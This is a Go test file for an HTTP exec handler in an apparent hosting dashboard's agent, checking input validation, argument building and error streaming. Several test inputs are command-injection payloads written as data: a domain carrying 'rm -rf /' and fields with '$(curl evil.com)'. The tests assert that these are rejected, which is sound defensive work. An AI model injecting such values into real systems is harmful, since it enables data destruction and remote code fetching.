package agent_test

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	agent "github.com/litesoup/litesoup-dashboard/agent"
)

type stubRunner struct {
	capturedArgs []string
}

func (s *stubRunner) Run(args []string) (io.ReadCloser, error) {
	s.capturedArgs = args
	return io.NopCloser(strings.NewReader("[INFO] ok\n")), nil
}

func TestExecHandler_RejectsUnknownCommand(t *testing.T) {
	body := `{"command":"server.destroy","params":{}}`
	h := agent.NewExecHandler(&stubRunner{})
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422, got %d", w.Code)
	}
}

func TestExecHandler_RejectsDomainWithShellMetachars(t *testing.T) {
	body := `{"command":"site.create","params":{"domain":"evil.com; rm -rf /","php_version":"8.2","tier":"small","tls":"none"}}`
	h := agent.NewExecHandler(&stubRunner{})
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422, got %d", w.Code)
	}
}

func TestExecHandler_RejectsUnknownPHPVersion(t *testing.T) {
	body := `{"command":"site.create","params":{"domain":"ok.com","php_version":"$(curl evil.com)","tier":"small","tls":"none"}}`
	h := agent.NewExecHandler(&stubRunner{})
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422, got %d", w.Code)
	}
}

func TestExecHandler_ValidCreateSiteStreamsOutput(t *testing.T) {
	body := `{"command":"site.create","params":{"domain":"test.com","php_version":"8.2","tier":"small","tls":"none"}}`
	runner := &stubRunner{}
	h := agent.NewExecHandler(runner)
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	// Verify CLI args built correctly
	expected := []string{"litesoup", "site", "create", "--domain=test.com", "--php=8.2", "--tier=small", "--tls=none"}
	if strings.Join(runner.capturedArgs, " ") != strings.Join(expected, " ") {
		t.Errorf("unexpected args: %v", runner.capturedArgs)
	}
	// Verify streamed output contains a "done" line
	scanner := bufio.NewScanner(w.Body)
	var hasDone bool
	for scanner.Scan() {
		var line agent.ExecLine
		if err := json.Unmarshal(scanner.Bytes(), &line); err != nil {
			continue
		}
		if line.Type == "done" {
			hasDone = true
		}
	}
	if !hasDone {
		t.Error("expected a done line in streamed output")
	}
}

func TestExecHandler_MissingRequiredParam(t *testing.T) {
	// domain is required for site.create; omit it
	body := `{"command":"site.create","params":{"php_version":"8.2","tier":"small","tls":"none"}}`
	h := agent.NewExecHandler(&stubRunner{})
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422, got %d", w.Code)
	}
}

func TestExecHandler_RunnerError(t *testing.T) {
	body := `{"command":"site.delete","params":{"domain":"test.com"}}`
	h := agent.NewExecHandler(&errorRunner{})
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 (streaming), got %d", w.Code)
	}
	// Should still emit a done line with code=1
	scanner := bufio.NewScanner(w.Body)
	var doneCode int = -1
	for scanner.Scan() {
		var line agent.ExecLine
		if err := json.Unmarshal(scanner.Bytes(), &line); err != nil {
			continue
		}
		if line.Type == "done" {
			doneCode = line.Code
		}
	}
	if doneCode != 1 {
		t.Errorf("expected done.code=1, got %d", doneCode)
	}
}

func TestExecHandler_RejectsGitRepoWithShellMetachars(t *testing.T) {
	body := `{"command":"site.create","params":{"domain":"test.com","php_version":"8.2","tier":"small","tls":"none","git_repo":"http://example.com/$(curl evil.com)"}}`
	h := agent.NewExecHandler(&stubRunner{})
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusUnprocessableEntity {
		t.Errorf("expected 422, got %d", w.Code)
	}
}

type errorRunner struct{}

func (e *errorRunner) Run(args []string) (io.ReadCloser, error) {
	return nil, fmt.Errorf("exec failed")
}
